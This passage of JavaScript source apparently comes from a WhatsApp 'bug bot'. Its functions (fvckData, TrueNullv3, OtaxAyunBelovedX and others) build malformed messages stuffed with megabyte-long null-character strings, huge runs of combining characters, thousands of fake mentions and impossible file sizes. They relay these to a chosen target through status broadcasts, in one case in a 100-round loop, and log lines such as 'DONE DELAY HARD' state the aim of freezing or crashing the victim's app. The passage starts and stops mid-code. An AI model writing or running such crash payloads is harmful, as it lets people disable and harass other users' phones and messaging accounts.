R6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhtargetdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9cttargetnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldtargetsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FetargetlBRdWjTcoqtargetLULeMtargetTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5Ntarget9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCtargetyLptargetWnVZqEYLL9QWasq0sPs5targetmHynuU/7dOT10targetWmVS0kqt1Qpy13ZzjF/k2avmz7utarget/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjtargetrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEtargetbm9MsWtargetvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7atargetwjdhGvqve7yaf0ytargetNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4Gwtarget9pRvrSrbtargetUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+target1ysV35eZLwzK+EYZeRurK29HtargetimlLeb5mMwzbjrtargetHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTctargetq2djTsaMJJtargetOu/U04aLo/MzvDH9oWnaw8Ua7ne2ptargetOWr300FJ04b8H1NdJj2GP7QtO1h4o5targetKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7targetn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPtargetSTPztargetbVrmwuY3FlWqUK0eU4PRntargetedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmtarget8Sn3I+RflUPA2/qK26btarget8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbptargetFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtltargetVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAtarget5NNzvdUrfLV4qkknUjuRtargetW2ZDhkPtC07WHih17ftarget2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79targetdZVEsJG8mP5ltargettNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wtargetUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJtargetMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVtargettlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUtargetWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
       const jamal = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      
      await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: jamal.message } },
      mention
        ? { messageId: jamal.key.id, participant: { jid: target } }
        : { messageId: jamal.key.id }
    );
    
    const zen = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const cxv = generateWAMessageFromContent(
    target,
    zen.message,
    { userJid: target }
  );
  
  await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: cxv.message } },
      mention
        ? { messageId: cxv.key.id, participant: { jid: target } }
        : { messageId: cxv.key.id }
    );
    
  const mark = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "X", format: "DEFAULT" },
              nativeFlowMessage: {
            messageParamsJson: "\u0000".repeat(10000),
            buttons: [
                {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(1045000)
                },
                {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                },
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ status: "1" })
                },
                {
                    name: "call_permission_request",
                    buttonParamsJson: "\x10".repeat(1045000)
                }
            ]
        },
            },
          },
        },
      },
      { userJid: target, quoted: null }
    );
    
    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: mark.message } },
      mention
        ? { messageId: mark.key.id, participant: { jid: target } }
        : { messageId: mark.key.id }
    );
}

async function fvckData(sock, target) {
  const generateMentions = (count = 50) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(50);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }
  
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".XrL" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  const DataMaklo = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  console.log(chalk.red(` buldozer done send to${target}`));

  const kontolLah = DataMaklo[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % DataMaklo.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = kontolLah;

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }, {});

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XrL-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Xrelly Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              X 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  
  await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      target
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
    
  await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: tmsg.message
        }
      },
      target
        ? { messageId: tmsg.key.id, participant: { jid: target } }
        : { messageId: tmsg.key.id }
    );
}

async function TrueNullv3(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  const ButtonMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
    mimetype: "audio/mpeg",
    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
    fileLength: 9999999999,
    seconds: 999999999999,
    ptt: true,
    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
    mediaKeyTimestamp: 99999999999999,
    waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    contextInfo: {
      mentionedJid: [
        "1@s.whatsapp.net",
        target,
        ...Array.from({ length: 9999 }, () =>
          `1${Math.floor(Math.random() * 9e7)}@s.whatsapp.net`
        )
      ],
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        serverMessageId: 1,
        newsletterName: "X"
      }
    }
  };

  const msg = generateWAMessageFromContent(
    target,
    { ephemeralMessage: { message: { ButtonMessage } } },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const PaymentMessage = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", PaymentMessage.message, {
    messageId: PaymentMessage.key.id,
    statusJidList: [target]
  });

  console.log(chalk.red(`Succes Send ${target}`));
}

async function OtaxAyunBelovedX(sock, target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "蟽骗伪讗 Nih Boes", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "999999"),
    }
  );

  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  console.log(chalk.red(`${target} DONE DELAY HARD BY GXION ✅`));

  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from(
        { length: 300 },
        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
      ),
    ],
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  const msgxayy = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  };

  let interxnxx = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "馃└",
      contentText: "饾檮饾櫍饾檻饾櫈饾櫒 饾檴饾櫓饾櫀饾櫗",
      footerText: "InvisibleHard嗉?",
      buttons: [
        {
          buttonId: ".bugs",
          buttonText: {
            displayText: "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  const statusMessages = [stickerMsg, msgxay, msgxayy];

  const content = {
    extendedTextMessage: {
      text: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(30000),
      matchedText: "軎?".repeat(20000),
      description: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴",
      title: "軎?".repeat(20000),
      previewType: "NONE",
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 300 },
            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName:
              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(10000),
            caption:
              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" +
              "軎?".repeat(60000) +
              "釤勧煗".repeat(60000),
            inviteExpiration: "999999999",
          },
        },
        forwardedNewsletterMessageInfo: {
          newsletterName:
            "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "鈨濌櫚隀瓣櫚".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1,
        },
      },
    },
  };

  const xnxxmsg = generateWAMessageFromContent(target, content, {});

  for (let i = 0; i < 100; i++) {
    await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", interxnxx.message, {
      messageId: interxnxx.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });
    }

    if (i < 99) {
      await new Promise((resolve) => setTimeout(resolve, 4000));
    }
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: xnxxmsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
